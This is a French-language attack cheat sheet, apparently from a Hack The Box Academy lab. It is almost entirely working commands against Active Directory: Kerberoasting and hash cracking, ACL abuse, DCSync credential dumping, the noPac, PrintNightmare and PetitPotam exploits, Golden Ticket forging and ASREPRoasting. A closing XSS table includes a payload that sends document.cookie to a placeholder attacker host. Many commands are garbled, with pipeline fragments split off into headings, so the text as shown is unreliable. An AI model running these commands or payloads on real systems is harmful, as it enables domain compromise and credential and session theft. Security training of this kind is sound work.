`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev`
```

### Outil Impacket utilisé pour télécharger/demander un ticket TGS pour un compte utilisateur spécifique et écrire le ticket dans un fichier (`-outputfile sqldev_tgs`) depuis un hôte basé sur Linux.

```bash
`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs`
```

### Tente de cracker le hash du ticket Kerberos (`-m 13100`) (`sqldev_tgs`) en utilisant `hashcat` et une liste de mots (`rockyou.txt`) depuis un hôte basé sur Linux.

```bash
`hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force`
```

### Utilisé pour énumérer les `SPN` dans un domaine Windows cible depuis un hôte basé sur Windows.

```bash
`setspn.exe -Q */*`
```

### Script PowerShell utilisé pour télécharger/demander le ticket TGS d'un utilisateur spécifique depuis un hôte basé sur Windows.

```bash
`Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"`
```

### Select-String '^CN' -Context 0,1 \

```bash
`setspn.exe -T INLANEFREIGHT.LOCAL -Q */* \
```

### Commande `Mimikatz` qui garantit que les tickets TGS sont extraits au format `base64` depuis un hôte basé sur Windows.

```bash
`mimikatz # base64 /out:true`
```

### Commande `Mimikatz` utilisée pour extraire les tickets TGS depuis un hôte basé sur Windows.

```bash
`kerberos::list /export`
```

### tr -d \\n`

```bash
`echo "<base64 blob>" \
```

### base64 -d > sqldev.kirbi`

```bash
`cat encoded_file \
```

### Utilisé pour extraire le `ticket Kerberos`. Cela crée également un fichier appelé `crack_file` depuis un hôte basé sur Linux.

```bash
`python2.7 kirbi2john.py sqldev.kirbi`
```

### Utilisé pour modifier le `crack_file` pour `Hashcat` depuis un hôte basé sur Linux.

```bash
`sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat`
```

### Utilisé pour visualiser le hash préparé depuis un hôte basé sur Linux.

```bash
`cat sqldev_tgs_hashcat`
```

### Utilisé pour cracker le hash du ticket Kerberos préparé (`sqldev_tgs_hashcat`) en utilisant une liste de mots (`rockyou.txt`) depuis un hôte basé sur Linux.

```bash
`hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt`
```

### select samaccountname`

```bash
`Import-Module .\PowerView.ps1 Get-DomainUser * -spn \
```

### Get-DomainSPNTicket -Format Hashcat`

```bash
`Get-DomainUser -Identity sqldev \
```

### Get-DomainSPNTicket -Format Hashcat \

```bash
`Get-DomainUser * -SPN \
```

### Utilisé pour visualiser le contenu du fichier .csv depuis un hôte basé sur Windows.

```bash
`cat .\ilfreight_tgs.csv`
```

### Utilisé pour visualiser les options et la fonctionnalité possibles avec l'outil `Rubeus`. Exécuté depuis un hôte basé sur Windows.

```bash
`.\Rubeus.exe`
```

### Utilisé pour vérifier les statistiques kerberoast (`/stats`) dans le domaine Windows cible depuis un hôte basé sur Windows.

```bash
`.\Rubeus.exe kerberoast /stats`
```

### Utilisé pour demander/télécharger des tickets TGS pour les comptes avec le `admin` count défini sur `1`, puis formate la sortie d'une manière facile à visualiser et à cracker (`/nowrap`). Exécuté depuis un hôte basé sur Windows.

```bash
`.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap`
```

### Utilisé pour demander/télécharger un ticket TGS pour un utilisateur spécifique (`/user:testspn`), puis formate la sortie d'une manière facile à visualiser et à cracker (`/nowrap`). Exécuté depuis un hôte basé sur Windows.

```bash
`.\Rubeus.exe kerberoast /user:testspn /nowrap`
```

### Outil PowerView utilisé pour vérifier l'attribut `msDS-SupportedEncryptionType` associé à un compte utilisateur spécifique (`testspn`). Exécuté depuis un hôte basé sur Windows.

```bash
`Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes`
```

### Utilisé pour tenter de cracker le hash du ticket en utilisant une liste de mots (`rockyou.txt`) depuis un hôte basé sur Linux.

```bash
`hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt`
```

## Énumération et Tactiques ACL

### Outil PowerView utilisé pour trouver des ACL d'objets dans le domaine Windows cible avec des droits de modification définis pour des objets non intégrés depuis un hôte basé sur Windows.

```bash
`Find-InterestingDomainAcl`
```

### Utilisé pour importer PowerView et récupérer le `SID` d'un compte utilisateur spécifique (`wley`) depuis un hôte basé sur Windows.

```bash
`Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley`
```

### ? {$_.SecurityIdentifier -eq $sid}`

```bash
`Get-DomainObjectACL -Identity * \
```

### Select Name,DisplayName,DistinguishedName,rightsGuid \

```bash
`$guid= "00299570-246d-11d0-a768-00aa006e0529" Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * \
```

### ? {$_.SecurityIdentifier -eq $sid}`

```bash
`Get-DomainObjectACL -ResolveGUIDs -Identity * \
```

### Select-Object -ExpandProperty SamAccountName > ad_users.txt`

```bash
`Get-ADUser -Filter * \
```

### Select-Object Path -ExpandProperty Access \

```bash
`foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" \
```

### Utilisé pour créer un `Objet PSCredential` depuis un hôte basé sur Windows.

```bash
`$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)`
```

### Utilisé pour créer un `Objet SecureString` depuis un hôte basé sur Windows.

```bash
`$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force`
```

### Outil PowerView utilisé pour changer le mot de passe d'un utilisateur spécifique (`damundsen`) sur un domaine Windows cible depuis un hôte basé sur Windows.

```bash
`Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose`
```

### Select -ExpandProperty Members`

```bash
`Get-ADGroup -Identity "Help Desk Level 1" -Properties * \
```

### Outil PowerView utilisé pour ajouter un utilisateur spécifique (`damundsen`) à un groupe de sécurité spécifique (`Help Desk Level 1`) dans un domaine Windows cible depuis un hôte basé sur Windows.

```bash
`Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose`
```

### Select MemberName`

```bash
`Get-DomainGroupMember -Identity "Help Desk Level 1" \
```

### Outil PowerView utilisé pour créer un faux `Service Principal Name` pour un utilisateur spécifique (`adunn`) depuis un hôte basé sur Windows.

```bash
`Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose`
```

### Outil PowerView utilisé pour supprimer le faux `Service Principal Name` créé pendant l'attaque depuis un hôte basé sur Windows.

```bash
`Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose`
```

### Outil PowerView utilisé pour retirer un utilisateur spécifique (`damundsent`) d'un groupe de sécurité spécifique (`Help Desk Level 1`) depuis un hôte basé sur Windows.

```bash
`Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose`
```

### Cmdlet PowerShell utilisé pour convertir une `chaîne SDDL` dans un format lisible. Exécuté depuis un hôte basé sur Windows.

```bash
`ConvertFrom-SddlString`
```



# DCSync, Accès Privilégié et Exploits Windows

## Table des matières
1. [DCSync](#dcsync)
2. [Accès Privilégié](#accès-privilégié)
3. [NoPac](#nopac)
4. [PrintNightmare](#printnightmare)
5. [PetitPotam](#petitpotam)

## DCSync

### select samaccountname,objectsid,memberof,useraccountcontrol \

```bash
`Get-DomainUser -Identity adunn \
```

### ? { ($_.ObjectAceType -match 'Replication-Get')} \

```bash
`$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs \
```

### Outil Impacket utilisé pour extraire les hachages NTLM du fichier NTDS.dit hébergé sur un contrôleur de domaine cible (`172.16.5.5`) et enregistrer les hachages extraits dans un fichier (`inlanefreight_hashes`). Exécuté depuis un hôte basé sur Linux.

```bash
`secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss`
```

### Utilise `Mimikatz` pour effectuer une attaque `dcsync` depuis un hôte basé sur Windows.

```bash
`mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator`
```

## Accès Privilégié

### Outil basé sur PowerView utilisé pour énumérer le groupe `Utilisateurs Bureau à distance` sur une cible Windows (`-ComputerName ACADEMY-EA-MS01`) depuis un hôte basé sur Windows.

```bash
`Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"`
```

### Outil basé sur PowerView utilisé pour énumérer le groupe `Utilisateurs de gestion à distance` sur une cible Windows (`-ComputerName ACADEMY-EA-MS01`) depuis un hôte basé sur Windows.

```bash
`Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"`
```

### Crée une variable (`$password`) définie comme égale au mot de passe (`Klmcargo2`) d'un utilisateur depuis un hôte basé sur Windows.

```bash
`$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force`
```

### Crée une variable (`$cred`) définie comme égale au nom d'utilisateur (`forend`) et au mot de passe (`$password`) d'un compte de domaine cible depuis un hôte basé sur Windows.

```bash
`$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)`
```

### Utilise le cmdlet PowerShell `Enter-PSSession` pour établir une session PowerShell avec une cible sur le réseau (`-ComputerName ACADEMY-EA-DB01`) depuis un hôte basé sur Windows. S'authentifie à l'aide des informations d'identification créées dans les 2 commandes présentées précédemment (`$cred` & `$password`).

```bash
`Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred`
```

### Utilisé pour établir une session PowerShell avec une cible Windows depuis un hôte basé sur Linux en utilisant `WinRM`.

```bash
`evil-winrm -i 10.129.201.234 -u forend`
```

### Utilisé pour importer l'outil `PowerUpSQL`.

```bash
`Import-Module .\PowerUpSQL.ps1`
```

### Outil PowerUpSQL utilisé pour énumérer les instances de serveur SQL depuis un hôte basé sur Windows.

```bash
`Get-SQLInstanceDomain`
```

### Outil PowerUpSQL utilisé pour se connecter à un serveur SQL et interroger la version (`-query 'Select @@version'`) depuis un hôte basé sur Windows.

```bash
`Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'`
```

### Outil Impacket utilisé pour afficher les fonctionnalités et les options fournies avec `mssqlclient.py` depuis un hôte basé sur Linux.

```bash
`mssqlclient.py`
```

### Outil Impacket utilisé pour se connecter à un serveur MSSQL depuis un hôte basé sur Linux.

```bash
`mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth`
```

### Utilisé pour afficher les options de mssqlclient.py une fois connecté à un serveur MSSQL.

```bash
`SQL> help`
```

### Utilisé pour activer la `procédure stockée xp_cmdshell` qui permet d'exécuter des commandes OS via la base de données depuis un hôte basé sur Linux.

```bash
`SQL> enable_xp_cmdshell`
```

### Utilisé pour énumérer les droits sur un système en utilisant `xp_cmdshell`.

```bash
`xp_cmdshell whoami /priv`
```

## NoPac

### Utilisé pour cloner un exploit `noPac` à l'aide de git. Exécuté depuis un hôte basé sur Linux.

```bash
`sudo git clone https://github.com/Ridter/noPac.git`
```

### Exécute `scanner.py` pour vérifier si un système cible est vulnérable à `noPac`/`Sam_The_Admin` depuis un hôte basé sur Linux.

```bash
`sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap`
```

### Utilisé pour exploiter la vulnérabilité `noPac`/`Sam_The_Admin` et obtenir un shell SYSTEM (`-shell`). Exécuté depuis un hôte basé sur Linux.

```bash
`sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap`
```

### Utilisé pour exploiter la vulnérabilité `noPac`/`Sam_The_Admin` et effectuer une attaque `DCSync` contre le compte Administrateur intégré sur un contrôleur de domaine depuis un hôte basé sur Linux.

```bash
`sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator`
```

## PrintNightmare

### Utilisé pour cloner un exploit PrintNightmare à l'aide de git depuis un hôte basé sur Linux.

```bash
`git clone https://github.com/cube0x0/CVE-2021-1675.git`
```

### Utilisé pour s'assurer que la version Impacket de l'auteur de l'exploit (`cube0x0`) est installée. Cela désinstalle également toute version précédente d'Impacket sur un hôte basé sur Linux.

```bash
`pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install`
```

### egrep 'MS-RPRN\

```bash
`rpcdump.py @172.16.5.5 \
```

### Utilisé pour générer une charge utile DLL à utiliser par l'exploit pour obtenir une session shell. Exécuté depuis un hôte basé sur Windows.

```bash
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll`
```

### Utilisé pour créer un serveur SMB et héberger un dossier partagé (`CompData`) à l'emplacement spécifié sur l'hôte linux local. Cela peut être utilisé pour héberger la charge utile DLL que l'exploit tentera de télécharger sur l'hôte. Exécuté depuis un hôte basé sur Linux.

```bash
`sudo smbserver.py -smb2support CompData /path/to/backupscript.dll`
```

### Exécute l'exploit et spécifie l'emplacement de la charge utile DLL. Exécuté depuis un hôte basé sur Linux.

```bash
`sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'`
```

## PetitPotam

### Outil Impacket utilisé pour créer un `relais NTLM` en spécifiant l'URL d'inscription web pour l'hôte de l'`autorité de certification`. Exécuté depuis un hôte basé sur Linux.

```bash
`sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController`
```

### Utilisé pour cloner l'exploit `PetitPotam` à l'aide de git. Exécuté depuis un hôte basé sur Linux.

```bash
`git clone https://github.com/topotam/PetitPotam.git`
```

### Utilisé pour exécuter l'exploit PetitPotam en spécifiant l'adresse IP de l'hôte d'attaque (`172.16.5.255`) et le contrôleur de domaine cible (`172.16.5.5`). Exécuté depuis un hôte basé sur Linux.

```bash
`python3 PetitPotam.py 172.16.5.225 172.16.5.5`
```

### Utilise `gettgtpkinit.py` pour demander un ticket TGT pour le contrôleur de domaine (`dc01.ccache`) depuis un hôte basé sur Linux.

```bash
`python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64 certificate> = dc01.ccache`
```

### Outil Impacket utilisé pour effectuer une attaque DCSync et récupérer un ou tous les `hachages de mot de passe NTLM` du domaine Windows cible. Exécuté depuis un hôte basé sur Linux.

```bash
`secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`
```

### Commande `krb5-user` utilisée pour afficher le contenu du fichier `ccache`. Exécutée depuis un hôte basé sur Linux.

```bash
`klist`
```

### Utilisé pour soumettre des demandes TGS à l'aide de `getnthash.py` depuis un hôte basé sur Linux.

```bash
`python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$`
```

### Outil Impacket utilisé pour extraire des hachages de `NTDS.dit` à l'aide d'une `attaque DCSync` et d'un hachage capturé (`-hashes`). Exécuté depuis un hôte basé sur Linux.

```bash
`secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba`
```

### Utilise Rubeus pour demander un TGT et effectuer une `attaque pass-the-ticket` en utilisant le compte machine (`/user:ACADEMY-EA-DC01$`) d'une cible Windows. Exécuté depuis un hôte basé sur Windows.

```bash
`.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /<base64 certificate>=/ptt`
```

### Effectue une attaque DCSync à l'aide de `Mimikatz`. Exécuté depuis un hôte basé sur Windows.

```bash
`mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt`
```



# Mauvaises Configurations, Relations de Confiance et XSS

## Table des matières
1. [Mauvaises Configurations Diverses](#mauvaises-configurations-diverses)
2. [Énumération et Attaques de Stratégie de Groupe](#énumération-et-attaques-de-stratégie-de-groupe)
3. [ASREPRoasting](#asreproasting)
4. [Relations de Confiance - Enfant > Parent](#relations-de-confiance---enfant--parent)
5. [Relations de Confiance - Inter-Forêts](#relations-de-confiance---inter-forêts)
6. [XSS](#xss)

## Mauvaises Configurations Diverses

### Utilisé pour importer le module `Security Assessment.ps1`. Exécuté depuis un hôte basé sur Windows.

```bash
`Import-Module .\SecurityAssessment.ps1`
```

### Outil basé sur SecurityAssessment.ps1 utilisé pour énumérer une cible Windows pour le `bug d'imprimante MS-PRN`. Exécuté depuis un hôte basé sur Windows.

```bash
`Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`
```

### Utilisé pour résoudre tous les enregistrements dans une zone DNS via `LDAP` depuis un hôte basé sur Linux.

```bash
`adidnsdump -u inlanefreight\\forend ldap://172.16.5.5`
```

### Utilisé pour résoudre les enregistrements inconnus dans une zone DNS en effectuant une `requête A` (`-r`) depuis un hôte basé sur Linux.

```bash
`adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r`
```

### Select-Object samaccountname,description`

```bash
`Get-DomainUser * \
```

### Select-Object samaccountname,useraccountcontrol`

```bash
`Get-DomainUser -UACFilter PASSWD_NOTREQD \
```

### Utilisé pour lister le contenu d'un partage hébergé sur une cible Windows depuis le contexte d'un utilisateur actuellement connecté. Exécuté depuis un hôte basé sur Windows.

```bash
`ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts`
```

## Énumération et Attaques de Stratégie de Groupe

### Outil utilisé pour déchiffrer un `mot de passe de préférence de stratégie de groupe` capturé depuis un hôte basé sur Linux.

```bash
`gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE`
```

### grep gpp`

```bash
`crackmapexec smb -L \
```

### Localise et récupère toutes les informations d'identification stockées dans le partage `SYSVOL` d'une cible Windows en utilisant `CrackMapExec` depuis un hôte basé sur Linux.

```bash
`crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin`
```

### select displayname`

```bash
`Get-DomainGPO \
```

### Select DisplayName`

```bash
`Get-GPO -All \
```

### Crée une variable appelée `$sid` qui est définie comme égale à l'outil `Convert-NameToSid` et spécifie le compte de groupe `Domain Users`. Exécuté depuis un hôte basé sur Windows.

```bash
`$sid=Convert-NameToSid "Domain Users"`
```

### Get-ObjectAcl \

```bash
`Get-DomainGPO \
```

### Cmdlet PowerShell utilisé pour afficher le nom d'une GPO étant donné un `GUID`. Exécuté depuis un hôte basé sur Windows.

```bash
`Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532`
```

## ASREPRoasting

### select samaccountname,userprincipalname,useraccountcontrol \

```bash
`Get-DomainUser -PreauthNotRequired \
```

### Utilise `Rubeus` pour effectuer une `attaque ASREP Roasting` et formate la sortie pour `Hashcat`. Exécuté depuis un hôte basé sur Windows.

```bash
`.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat`
```

### Utilise `Hashcat` pour tenter de cracker le hash capturé en utilisant une liste de mots (`rockyou.txt`). Exécuté depuis un hôte basé sur Linux.

```bash
`hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt`
```

### Énumère les utilisateurs dans un domaine Windows cible et récupère automatiquement l'`AS` pour tous les utilisateurs trouvés qui ne nécessitent pas de pré-authentification Kerberos. Exécuté depuis un hôte basé sur Linux.

```bash
`kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`
```

## Relations de Confiance - Enfant > Parent

### Utilisé pour importer le module `Active Directory`. Exécuté depuis un hôte basé sur Windows.

```bash
`Import-Module activedirectory`
```

### Cmdlet PowerShell utilisé pour énumérer les relations de confiance d'un domaine Windows cible. Exécuté depuis un hôte basé sur Windows.

```bash
`Get-ADTrust -Filter *`
```

### Outil PowerView utilisé pour énumérer les relations de confiance d'un domaine Windows cible. Exécuté depuis un hôte basé sur Windows.

```bash
`Get-DomainTrust`
```

### Outil PowerView utilisé pour effectuer une cartographie des relations de confiance de domaine depuis un hôte basé sur Windows.

```bash
`Get-DomainTrustMapping`
```

### select SamAccountName`

```bash
`Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL \
```

### Utilise Mimikatz pour obtenir le `NT Hash` du compte `KRBTGT` depuis un hôte basé sur Windows.

```bash
`mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt`
```

### Outil PowerView utilisé pour obtenir le SID d'un domaine enfant cible depuis un hôte basé sur Windows.

```bash
`Get-DomainSID`
```

### select distinguishedname,objectsid`

```bash
`Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" \
```

### Utilisé pour tenter de lister le contenu du lecteur C sur un contrôleur de domaine cible. Exécuté depuis un hôte basé sur Windows.

```bash
`ls \\academy-ea-dc01.inlanefreight.local\c$`
```

### Utilise `Mimikatz` pour créer un `Golden Ticket` depuis un hôte basé sur Windows.

```bash
`mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt`
```

### Utilise `Rubeus` pour créer un `Golden Ticket` depuis un hôte basé sur Windows.

```bash
`.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt`
```

### Utilise `Mimikatz` pour effectuer une attaque DCSync depuis un hôte basé sur Windows.

```bash
`mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm`
```

### Outil Impacket utilisé pour effectuer une attaque DCSync depuis un hôte basé sur Linux.

```bash
`secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt`
```

### Outil Impacket utilisé pour effectuer une attaque de `force brute SID` depuis un hôte basé sur Linux.

```bash
`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240`
```

### grep "Domain SID"`

```bash
`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \
```

### grep -B12 "Enterprise Admins"`

```bash
`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 \
```

### Outil Impacket utilisé pour créer un `Golden Ticket` depuis un hôte basé sur Linux.

```bash
`ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker`
```

### Utilisé pour définir la `variable d'environnement KRB5CCNAME` depuis un hôte basé sur Linux.

```bash
`export KRB5CCNAME=hacker.ccache`
```

### Outil Impacket utilisé pour établir une session shell avec un contrôleur de domaine cible depuis un hôte basé sur Linux.

```bash
`psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5`
```

### Outil Impacket qui effectue automatiquement une attaque qui permet l'escalade de privilèges du domaine enfant vers le domaine parent.

```bash
`raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm`
```

## Relations de Confiance - Inter-Forêts

### select SamAccountName`

```bash
`Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL \
```

### select samaccountname,memberof`

```bash
`Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc \
```

### Utilise `Rubeus` pour effectuer une attaque Kerberoasting contre un domaine Windows cible (`/domain:FREIGHTLOGISTICS.local`) depuis un hôte basé sur Windows.

```bash
`.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap`
```

### Outil PowerView utilisé pour énumérer les groupes avec des utilisateurs qui n'appartiennent pas au domaine depuis un hôte basé sur Windows.

```bash
`Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL`
```

### Cmdlet PowerShell utilisé pour se connecter à distance à un système Windows cible depuis un hôte basé sur Windows.

```bash
`Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator`
```

### Outil Impacket utilisé pour demander (`-request`) le ticket TGS d'un compte dans un domaine Windows cible (`-target-domain`) depuis un hôte basé sur Linux.

```bash
`GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`
```

### Exécute l'implémentation Python de `BloodHound` contre un domaine Windows cible depuis un hôte basé sur Linux.

```bash
`bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2`
```

### Utilisé pour compresser plusieurs fichiers en un seul fichier `.zip` à télécharger dans l'interface BloodHound.

```bash
`zip -r ilfreight_bh.zip *.json`
```

## XSS

| Code | Description |
|------|-------------|
| **Payloads XSS** | |
| `<script>alert(window.origin)</script>` | Payload XSS de base |
| `<plaintext>` | Payload XSS de base |
| `<script>print()</script>` | Payload XSS de base |
| `<img src="" onerror=alert(window.origin)>` | Payload XSS basé sur HTML |
| `<script>document.body.style.background = "#141d2b"</script>` | Changer la couleur d'arrière-plan |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Changer l'image d'arrière-plan |
| `<script>document.title = 'HackTheBox Academy'</script>` | Changer le titre du site web |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Réécrire le corps principal du site web |
| `<script>document.getElementById('urlform').remove();</script>` | Supprimer un élément HTML spécifique |
| `<script src="http://NOTRE_IP/script.js"></script>` | Charger un script distant |
| `<script>new Image().src='http://NOTRE_IP/index.php?c='+document.cookie</script>` | Envoyer les détails du cookie vers nous |
| **Commandes** | |
| `python xsstrike.py -u "http://IP_SERVEUR:PORT/index.php?task=test"` | Exécuter `xsstrike` sur un paramètre d'URL |
| `sudo nc -lvnp 80` | Démarrer un écouteur `netcat` |
| `sudo php -S 0.0.0.0:80` | Démarrer un serveur `PHP` |
